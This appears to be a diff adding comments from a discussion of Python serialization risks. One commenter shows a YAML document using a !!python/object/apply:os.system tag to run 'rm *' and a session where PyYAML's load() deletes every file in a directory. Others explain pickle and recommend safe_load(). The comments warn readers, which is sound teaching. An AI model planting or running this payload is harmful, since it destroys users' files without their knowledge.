@@ -1,0 +1,36 @@
+Dangerous Pickles — Malicious Python Serialization
+
+YAML can also be hazardous, as if you naively load the following, it can delete all the files in your current directory:
+
+    name: John
+    favorite_food: Pizza
+    favorite_activity: !!python/object/apply:os.system ['rm *']
+
+The [issue](https://github.com/yaml/pyyaml/issues/5) was finally fixed a few months ago (after 4 years), but there *hasn't been a release to PyPI* in over a year. Note that the above works without you having to import `os` or anything:
+
+    ~/trash $ ls
+    ~/trash $ touch a b c
+    ~/trash $ ls
+    a  b  c
+    ~/trash $ pip freeze | grep YAML
+    PyYAML==3.12
+    ~/trash $ python
+    Python 3.6.1 (default, Mar 22 2017, 11:03:00) 
+    [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)] on darwin
+    Type "help", "copyright", "credits" or "license" for more information.
+    >>> import yaml
+    >>> yaml.load('''
+    ... name: John
+    ... favorite_food: Pizza
+    ... favorite_activity: !!python/object/apply:os.system ['rm *']
+    ... ''')
+    {'name': 'John', 'favorite_food': 'Pizza', 'favorite_activity': 0}
+    >>> exit()
+    ~/trash $ ls
+    ~/trash $
+
+Very cool and very well written. I wish I knew what the purpose of pickle is though. Is it just a was of compressing data?
+This is why you should use safe_load(), not load()
+It's used for serialization. 
+It converts just about any type to a string and back. This is useful for e.g. saving to/loading from a file or sending stuff across the internet.
+I.e saving the state of a Python object in case that wasn't clear.
